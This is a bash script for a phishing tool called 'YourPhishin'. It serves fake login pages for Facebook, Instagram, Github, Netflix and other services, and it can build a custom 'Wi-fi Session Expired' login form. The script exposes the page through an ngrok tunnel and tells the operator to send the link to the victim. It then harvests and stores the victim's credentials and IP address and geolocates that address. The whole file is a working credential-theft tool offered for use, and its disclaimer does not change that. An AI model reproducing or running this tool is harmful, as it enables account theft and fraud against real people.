#!/bin/bash

menu() {
printf '\n[1] Facebook\n'
printf '\n[2] Instagram\n'
printf '\n[3] Github\n'
printf '\n[4] Linkedin\n'
printf '\n[5] Twitter\n'
printf '\n[6] Netflix\n'
printf '\n[7] Spotify\n'
printf '\n[8] Snapchat\n'
printf '\n[9] Pinterest\n'
printf '\n[10] Exit\n'   

read -p $'\nChoose an option:' option

if [[ $option == 1 || $option == 01 ]]; then
server="facebook"
start

elif [[ $option == 2 || $option == 02 ]]; then
server="instagram"
start

elif [[ $option == 3 || $option == 03 ]]; then
server="github"
start

elif [[ $option == 4 || $option == 04 ]]; then
server="linkedin"
start

elif [[ $option == 5 || $option == 05 ]]; then
server="twitter"
start

elif [[ $option == 6 || $option == 06 ]]; then
server="netflix"
start

elif [[ $option == 7 || $option == 07 ]]; then
server="spotify"
start

elif [[ $option == 8 || $option == 08 ]]; then
server="snapchat"
start

elif [[ $option == 9 || $option == 09 ]]; then
server="pinterest"
start

elif [[ $option == 10 ]]; then
exit 1

else
printf "You Enter Wrong Choice !!!\n"
sleep 1
clear
menu
fi
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}

banner() {

echo -e "\t\t\t\t\t  ██╗   ██╗ ██████╗ ██╗   ██╗██████╗ ██████╗ ██╗  ██╗██╗███████╗██╗███╗   ██╗ "|lolcat -p -a -d 3
echo -e "\t\t\t\t\t ╚██╗ ██╔╝██╔═══██╗██║   ██║██╔══██╗██╔══██╗██║  ██║██║██╔════╝██║████╗  ██║  "|lolcat -p -a -d 3 
echo -e "\t\t\t\t\t  ╚████╔╝ ██║   ██║██║   ██║██████╔╝██████╔╝███████║██║███████╗██║██╔██╗ ██║  "|lolcat -p -a -d 3
echo -e "\t\t\t\t\t   ╚██╔╝  ██║   ██║██║   ██║██╔══██╗██╔═══╝ ██╔══██║██║╚════██║██║██║╚██╗██║  "|lolcat -p -a -d 3
echo -e "\t\t\t\t\t    ██║   ╚██████╔╝╚██████╔╝██║  ██║██║     ██║  ██║██║███████║██║██║ ╚████║  "|lolcat -p -a -d 3
echo -e "\t\t\t\t\t    ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝╚═╝  ╚═══╝  "|lolcat -p -a -d 3

printf '\n\t\t\t\t\t:: Developer are not responsible for any misuse or damage caused by YOURPHISIN ::\n'
printf '\n\t\t\t\t\t\t\t:: YourPhishin is Social Engineering Tool ::\n'

}

createpage() {
default_cap1="Wi-fi Session Expired"
default_cap2="Please login again."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -p $'\e[ Title 1 (Default: Wi-fi Session Expired): \e' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[] Title 2 (Default: Please login again.): \e[' cap2
cap2="${cap2:-${default_cap2}}"

read -p $'\e Username field (Default: Username:): \e[' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e Password field (Default: Password:): \e[' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[ Submit field (Default: Log-In): \e[' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > sites/create/login.html
echo "<html>" >> sites/create/login.html
echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
printf '</center>' >> sites/create/login.html
printf '<body>\n' >> sites/create/login.html
printf '</html>\n' >> sites/create/login.html


}

catch_cred() {

account=$(grep -o 'Account:.*' sites/$server/cred.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/cred.txt | cut -d ":" -f2)
printf "=>\nID:- %s\n" $account
printf "=>\nPassword:- %s\n" $password
cat sites/$server/cred.txt >> sites/$server/store.cred.txt
printf "=>\nStoring Credentials:- %s/store.cred.txt\n" $server
printf "\n"

printf "{+}Stay For Next IP,\e Ctrl + C for exiting Yourphishin tool !!!\n"

}


catch_ip() {
touch sites/$server/store.cred.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'

printf "=>\nVictim IP is:- %s\n" $ip

printf "=>\nStoring Ip :- %s/store.ip.txt\n" $server
cat sites/$server/ip.txt >> sites/$server/store.ip.txt

if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"


city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "{+}City Location:%s\n" $city
fi
printf "\n"
rm -rf iptracker.log

printf "\n{+}Press,\e Ctrl + C for exiting Yourphishin tool !!!\n"

}

start() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/cred.txt ]]; then
rm -rf sites/$server/cred.txt

fi



if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf " Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "Eror While Dowloading!!\n"
exit 1
fi



else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "Eror While Dowloading!!\n"
exit 1
fi
fi
fi

cd sites/$server && php -S 127.0.0.1:80 > /dev/null 2>&1 & 
sleep 2

./ngrok http 80 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\n{+}Send this link to the Victim: %s\n" $link
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi


printf "\n"

printf "\n[1].Ngrok\n"
default_option_server="1"
read -p $'Choose Port Forwarding Technique:' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == 1 || $option_server == 01 ]]; then
start

else
printf " You Selected Invalid option!!!\n"
sleep 1
clear
start1
fi

}
checkfound() {


printf "\n{+}Press,\e Ctrl + C for exiting Yourphishin tool !!!\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n{+}Got IP Address!!!\n"
catch_ip
rm -rf sites/$server/ip.txt
fi
sleep 0.5
if [[ -e "sites/$server/cred.txt" ]]; then
printf "\n{+}Got Credentials !!!!\n"
catch_cred
rm -rf sites/$server/cred.txt
fi
sleep 0.5
done 
}
banner
menu